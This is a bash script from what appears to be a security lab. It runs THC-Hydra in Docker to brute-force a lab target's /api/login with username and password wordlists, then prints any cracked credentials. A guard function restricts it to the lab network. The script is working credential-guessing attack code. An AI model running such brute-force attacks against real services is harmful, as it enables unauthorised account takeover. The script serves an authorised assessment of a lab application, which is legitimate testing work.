#!/usr/bin/env bash
# THC-Hydra brute force against the lab target's login (v1 only; F-02 in owasp-findings.md:
# no rate limit or account lockout). Uses http-post-form against /api/login.
# Usage: lab/03_hydra.sh [target_host:port] (default: target-shop on the lab network)
set -euo pipefail
cd "$(dirname "$0")"
source ./guard.sh
export MSYS_NO_PATHCONV=1  # Windows Git Bash: stop docker volume paths (/out, /wordlists) being rewritten as C: paths

TARGET="${1:-172.30.0.11:8080}"
require_lab_target "$TARGET"
TARGET_HOST="${TARGET%%:*}"
TARGET_PORT="${TARGET##*:}"
[[ "$TARGET_PORT" == "$TARGET_HOST" ]] && TARGET_PORT=8080   # no port given: default

OUT_DIR="../results/lab"
mkdir -p "$OUT_DIR"
TS="$(date +%Y%m%dT%H%M%S)"

docker build -q -t sentinel-lab/hydra ./tools/hydra >/dev/null

echo "[hydra] brute-forcing logins at ${TARGET_HOST}:${TARGET_PORT}/api/login (lab network only)"
docker run --rm --network lab \
  -v "$(pwd)/wordlists:/wordlists:ro" \
  -v "$(pwd)/../results/lab:/out" \
  sentinel-lab/hydra \
  -L /wordlists/users.txt -P /wordlists/passwords.txt \
  -o "/out/hydra_${TS}.txt" \
  -s "$TARGET_PORT" \
  -t 4 -V \
  "$TARGET_HOST" http-post-form \
  "/api/login:username=^USER^&password=^PASS^:1=:F=error"

echo "[hydra] results written to results/lab/hydra_${TS}.txt"
echo "--- found credentials ---"
grep -i "login:" "${OUT_DIR}/hydra_${TS}.txt" || echo "(none printed to file; see console output above)"
